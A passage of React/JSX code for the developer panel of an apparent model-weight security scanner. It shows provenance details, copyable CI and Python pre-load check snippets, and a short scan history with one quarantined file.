          >
            <span style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.8rem', fontWeight: 600, letterSpacing: '0.06em', color: 'var(--ink)', textTransform: 'uppercase' }}>
              CI/CD & Developers
            </span>
            <span style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.65rem', color: 'var(--signal)' }}>
              API READY
            </span>
          </div>

          <div style={{ padding: '1.15rem', display: 'flex', flexDirection: 'column', gap: '1.15rem', overflowY: 'auto' }}>
            {/* Provenance Card */}
            <div style={{ background: 'var(--void-deep)', border: '1px solid var(--border-glass)', borderRadius: '8px', padding: '0.9rem', display: 'flex', flexDirection: 'column', gap: '0.6rem' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', fontFamily: '"JetBrains Mono", monospace', fontSize: '0.72rem' }}>
                <span style={{ color: 'var(--ink-muted)' }}>SHA-256 HASH</span>
                <span style={{ color: 'var(--ink)', fontWeight: 500 }}>{scenario.sha256}</span>
              </div>
              <div style={{ display: 'flex', justifyContent: 'space-between', fontFamily: '"JetBrains Mono", monospace', fontSize: '0.72rem' }}>
                <span style={{ color: 'var(--ink-muted)' }}>SUPPLY CHAIN</span>
                <span style={{ color: scenario.isClean ? 'var(--success)' : 'var(--alert)' }}>{scenario.provenance}</span>
              </div>
              <div style={{ display: 'flex', justifyContent: 'space-between', fontFamily: '"JetBrains Mono", monospace', fontSize: '0.72rem' }}>
                <span style={{ color: 'var(--ink-muted)' }}>AST NODES</span>
                <span style={{ color: 'var(--ink)' }}>{scenario.nodes}</span>
              </div>
              <div style={{ display: 'flex', justifyContent: 'space-between', fontFamily: '"JetBrains Mono", monospace', fontSize: '0.72rem' }}>
                <span style={{ color: 'var(--ink-muted)' }}>EXECUTION RISK</span>
                <span style={{ color: 'var(--signal)' }}>0.000 ms</span>
              </div>
            </div>

            {/* CLI Command */}
            <div style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.72rem', color: 'var(--ink-muted)', textTransform: 'uppercase' }}>
              CI/CD Pipeline Command:
            </div>
            <div style={{ background: '#010304', border: '1px solid var(--border-glass)', borderRadius: '8px', padding: '0.85rem', position: 'relative' }}>
              <button
                onClick={copyCli}
                style={{
                  position: 'absolute',
                  top: '0.5rem',
                  right: '0.5rem',
                  background: 'rgba(255,255,255,0.06)',
                  border: '1px solid var(--border-glass)',
                  color: 'var(--ink-dim)',
                  fontFamily: '"JetBrains Mono", monospace',
                  fontSize: '0.65rem',
                  padding: '0.25rem 0.55rem',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                {copiedCli ? 'COPIED!' : 'COPY'}
              </button>
              <pre style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.72rem', color: 'var(--signal)', lineHeight: 1.5, margin: 0, whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
                {scenario.cli}
              </pre>
            </div>

            {/* Python SDK */}
            <div style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.72rem', color: 'var(--ink-muted)', textTransform: 'uppercase' }}>
              Python SDK Pre-Load Check:
            </div>
            <div style={{ background: '#010304', border: '1px solid var(--border-glass)', borderRadius: '8px', padding: '0.85rem', position: 'relative' }}>
              <button
                onClick={copyPy}
                style={{
                  position: 'absolute',
                  top: '0.5rem',
                  right: '0.5rem',
                  background: 'rgba(255,255,255,0.06)',
                  border: '1px solid var(--border-glass)',
                  color: 'var(--ink-dim)',
                  fontFamily: '"JetBrains Mono", monospace',
                  fontSize: '0.65rem',
                  padding: '0.25rem 0.55rem',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                {copiedPy ? 'COPIED!' : 'COPY'}
              </button>
              <pre style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.72rem', color: 'var(--ink-dim)', lineHeight: 1.5, margin: 0 }}>
{`import vigilant

# Static check prior to torch.load()
audit = vigilant.scan_weights("${scenario.filename}")
if not audit.is_safe:
    raise SecurityError(audit.cve)`}
              </pre>
            </div>

            {/* Audit History */}
            <div style={{ fontFamily: '"JetBrains Mono", monospace', fontSize: '0.72rem', color: 'var(--ink-muted)', textTransform: 'uppercase' }}>
              Scan History:
            </div>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', padding: '0.5rem 0.65rem', background: 'rgba(255,255,255,0.02)', borderRadius: '6px', fontFamily: '"JetBrains Mono", monospace', fontSize: '0.7rem' }}>
                <span>llama-3-8b.safetensors</span>
                <span style={{ color: 'var(--success)' }}>PASS</span>
              </div>
              <div style={{ display: 'flex', justifyContent: 'space-between', padding: '0.5rem 0.65rem', background: 'rgba(255,255,255,0.02)', borderRadius: '6px', fontFamily: '"JetBrains Mono", monospace', fontSize: '0.7rem' }}>
                <span>sdxl_lora_exploit.pt</span>
                <span style={{ color: 'var(--alert)' }}>QUARANTINED</span>
              </div>
            </div>
          </div>
        </section>
      </main>
    </div>
  );
}

